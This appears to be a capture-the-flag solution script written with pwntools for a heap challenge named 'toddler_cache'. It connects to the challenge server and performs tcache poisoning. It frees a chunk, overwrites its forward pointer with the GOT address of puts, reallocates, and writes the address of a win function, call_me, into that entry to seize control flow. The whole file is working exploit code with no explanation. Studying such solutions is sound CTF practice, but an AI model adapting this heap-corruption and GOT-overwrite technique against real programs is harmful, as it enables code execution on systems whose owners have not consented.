from pwn import *

# context.log_level = "debug"
context.binary = elf = ELF('./toddler_cache')
p = remote("cha.hackpack.club", 41703)
# p = process(['/lib64/ld-linux-x86-64.so.2', './toddler_cache'])
# gdb.attach(p,'init-peda')

def create():
    p.sendlineafter("> > ", '1')

def write(idx, val):
    p.sendlineafter("> > ", '2')
    p.sendlineafter("> ", str(idx))
    p.sendafter("write?\n", val)

def delete(idx):
    p.sendlineafter("> > ", '3')
    p.sendlineafter("> > ", str(idx))

create()
create()

delete(0)

write(0, p64(elf.got['puts']))
create()
create()
write(3, p64(elf.symbols['call_me']))


p.interactive()
p.close()
